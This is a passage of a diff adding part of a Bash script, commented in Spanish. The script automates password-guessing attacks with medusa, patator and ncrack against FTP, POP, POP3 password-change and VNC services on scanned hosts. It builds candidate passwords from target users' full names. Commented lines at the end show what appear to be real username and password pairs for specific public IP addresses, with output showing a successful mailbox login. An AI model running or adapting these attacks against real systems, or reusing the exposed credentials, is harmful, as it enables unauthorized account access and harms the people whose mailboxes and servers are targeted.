+			medusa -e n -u ftp -P top.txt -h $ip -M ftp >>  logs/cracking/"$ip"_21_passwordAdivinado.txt					
+			
+			respuesta=`grep --color=never SUCCESS logs/cracking/"$ip"_21_passwordAdivinado.txt`
+			greprc=$?
+			if [[ $greprc -eq 0 ]] ; then
+				echo -n "[FTP] $respuesta" >> .vulnerabilidades/"$ip"_21_passwordAdivinado.txt
+			fi
+			
+			echo ""		
+		else			
+			echo -e "\t[+] Es una impresora"			
+
+			echo ""		
+		fi	
+		#######################################		
+				
+		done
+		insert_data
+	 fi	
+fi
+
+#echo -e "\t $OKBLUE REVISANDO ERRORES $RESET"
+#grep -ira "timed out" logs/cracking/* 2>/dev/null >> errores.log
+#grep -ira "Can't connect" logs/cracking/* 2>/dev/null >> errores.log
+
+#Encritar resultados
+#rm .vulnerabilidades2/* 2>/dev/null
+7z a .resultados.7z .resultados.db -pcANRHPeREPZsCYGB8L64 >/dev/null
+rm .resultados.db
+	
+exit
+
+if [ -f servicios/pop.txt ]
+then
+	echo -e "\n\t $OKBLUE Encontre servicios de POP activos. Realizar ataque de passwords ? s/n $RESET"	  
+	read bruteforce	  
+	  
+	if [ $bruteforce == 's' ]
+    then     			
+      echo -e "\n\t $OKBLUE Archivo con la lista de usuarios? Formato: Daniel;Torres;Sandi $RESET"	  
+	  read users_file  	  
+	  
+	  echo -e "$OKBLUE\n\t#################### Testing common pass POP ######################$RESET"	
+	  for line in $(cat servicios/pop.txt); do
+		ip=`echo $line | cut -f1 -d":"`
+		port=`echo $line | cut -f2 -d":"`
+		echo -e "\n\t########### $ip #######"	
+		for fullname in $(cat $users_file); do
+			echo -e "\n\t########### Testing fullname $fullname #######"			
+			generate_password.pl "$fullname" > passwords2.txt # password en base a su usuario
+			head -1 passwords2.txt > base.txt # solo primer nombre
+			passGen.sh -f base.txt -t top50 -o passwords3.txt # mutaciones de su nombre
+			cat passwords2.txt passwords3.txt top.txt| sort | uniq > passwords.txt			
+			username=`tail -1 passwords2.txt` # dtorres
+			echo -e "\n\t[+] username $username"			
+			patator pop_login host=$ip user=$username password=FILE0 0=passwords.txt >> logs/cracking/"$ip"_pop-$username.txt 2>> logs/cracking/"$ip"_pop-$username.txt		
+			grep --color=never messages logs/cracking/"$ip"_pop-$username.txt >> .vulnerabilidades/"$ip"_pop_passwordAdivinado.txt
+			echo ""					
+			rm passwords.txt passwords2.txt passwords3.txt			
+			echo "Dormir 5 min"
+			sleep 300;
+		done					
+		echo ""			
+	 done
+	 insert_data
+	fi # if bruteforce
+fi
+	
+
+if [ -f servicios/pop3pw.txt ]
+then
+	echo -e "\n\t $OKBLUE Encontre servicios de pop3pw activos. Realizar ataque de passwords ? s/n $RESET"	  
+	read bruteforce	  
+	  
+	if [ $bruteforce == 's' ]
+    then     			
+      echo -e "\n\t $OKBLUE Archivo con la lista de usuarios? Formato: Daniel;Torres;Sandi $RESET"	  
+	  read users_file  	  
+	  
+	  echo -e "$OKBLUE\n\t#################### Testing common pass POP  ######################$RESET"	
+	  for line in $(cat servicios/pop3pw.txt); do
+		ip=`echo $line | cut -f1 -d":"`
+		port=`echo $line | cut -f2 -d":"`
+		echo -e "\n\t########### $ip #######"	
+		for fullname in $(cat $users_file); do
+			echo -e "\n\t########### Testing fullname $fullname #######"			
+			generate_password.pl "$fullname" > passwords2.txt # password en base a su usuario
+			head -1 passwords2.txt > base.txt # solo primer nombre
+			passGen.sh -f base.txt -t top50 -o passwords3.txt # mutaciones de su nombre
+			cat passwords2.txt passwords3.txt top.txt| sort | uniq > passwords.txt			
+			username=`tail -1 passwords2.txt` # dtorres
+			echo -e "\n\t[+] username $username"			
+			patator pop_passd host=$ip user=$username password=FILE0 0=passwords.txt >> logs/cracking/"$ip"_pop3pw-$username.txt 2>> logs/cracking/"$ip"_pop3pw-$username.txt		
+			grep --color=never "new password " logs/cracking/"$ip"_pop3pw-$username.txt >> .vulnerabilidades/"$ip"_pop3pw_passwordAdivinado.txt
+			echo ""					
+			rm passwords.txt passwords2.txt passwords3.txt			
+			echo "Dormir 5 min"
+			sleep 300;
+		done					
+		echo ""			
+	 done
+	 insert_data
+	fi # if bruteforce
+fi	
+
+
+
+
+if [ -f servicios/vnc.txt ]
+then
+	echo -e "\n\t $OKBLUE Encontre servicios de VNC activos. Realizar ataque de passwords ? s/n $RESET"	  
+	read bruteforce	  
+	  
+	if [ $bruteforce == 's' ]
+    then      	  
+	  echo -e "$OKBLUE\n\t#################### Testing common pass VNC (lennnto) ######################$RESET"	
+	  for line in $(cat servicios/vnc.txt); do
+		ip=`echo $line | cut -f1 -d":"`
+		port=`echo $line | cut -f2 -d":"`
+		echo -e "\n\t########### $ip #######"					
+		ncrack_instances=`pgrep ncrack | wc -l`
+		if [ "$ncrack_instances" -lt $max_ins ] #Max 10 instances
+		then
+			ncrack --user 'administrador' -P top.txt -p $port -g cd=8 $ip | tee -a  logs/cracking/"$ip"_"$port"_passwordAdivinado.txt &			
+			echo ""		
+		else
+			echo "Max instancias de ncrack ($max_ins)"
+			sleep 10;
+				
+		fi		
+		
+	  done
+	  
+	  sleep 5
+	  ### wait to finish
+	  while true; do
+		ncrack_instances=`pgrep ncrack | wc -l`
+		if [ "$ncrack_instances" -gt 0 ]
+		then
+			echo "Todavia hay escaneos de ncrack activos ($ncrack_instances)"  
+			sleep 30
+		else
+			break		  		 
+		fi				
+	  done
+	
+	  echo -e "\n\t########### Checking success #######"	
+	  for line in $(cat servicios/vnc.txt); do
+		ip=`echo $line | cut -f1 -d":"`
+		port=`echo $line | cut -f2 -d":"`
+						
+		grep --color=never "administrador" logs/cracking/"$ip"_"$port"_passwordAdivinado.txt > .vulnerabilidades/"$ip"_"$port"_passwordAdivinado.txt
+		echo ""			
+	  done
+	 
+	 	 
+	 insert_data
+	fi # if bruteforce
+fi
+	
+
+#patator pop_login host=181.115.239.243 user=msanti password='Bichito$9'
+#17:20:24 patator    INFO - Starting Patator v0.6 (http://code.google.com/p/patator/) at 2018-10-22 17:20 EDT
+#17:20:24 patator    INFO -                                                                              
+#17:20:24 patator    INFO - code  size   time | candidate                          |   num | mesg
+#17:20:24 patator    INFO - -----------------------------------------------------------------------------
+#17:20:25 patator    INFO - +OK   32    0.094 |                                    |     1 | 3076 messages (263203895 octets)
+
+
+#patator pop_passd host=190.129.11.29 user=jaguilar password=jhashy275
+#16:40:34 patator    INFO - Starting Patator v0.6 (http://code.google.com/p/patator/) at 2018-10-22 16:40 EDT
+#16:40:34 patator    INFO -                                                                              
+##16:40:34 patator    INFO - code  size   time | candidate                          |   num | mesg
+#16:40:34 patator    INFO - -----------------------------------------------------------------------------
+#16:40:34 patator    INFO - 200   25    0.127 |                                    |     1 | Your new password please
+
+
+
